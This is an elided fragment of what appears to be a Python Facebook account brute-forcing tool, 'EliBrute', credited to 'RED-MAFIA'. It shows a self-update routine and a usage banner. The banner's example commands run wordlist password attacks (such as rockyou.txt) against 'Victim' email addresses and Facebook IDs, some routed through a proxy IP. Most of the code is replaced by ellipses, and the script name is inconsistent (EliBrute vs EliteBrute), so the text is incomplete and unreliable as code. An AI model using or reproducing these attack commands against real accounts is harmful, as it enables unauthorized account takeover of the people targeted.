...
==================================\n"""+wi)
    ...
    def updateFaceBoom():
        ...
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
                ...
                with open("EliBrute.py", "w") as  faceBoomScript:
...
Usage: python ./EliBrute.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -u/--update                             ::> Update EliBrute Script
-------------
Examples:
        |
     |--------
     | python EliteBrute.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python EliteBrute.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python EliteBrute.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python EliteBrute.py -t Victim@gmail.com -s 1234567
     |--------
     | python EliteBrute.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
...
#####################                #########################
##############################################################
#This Tool by RED-MAFIA
#Have a nice day :)
#Elite Hackers & Programmers
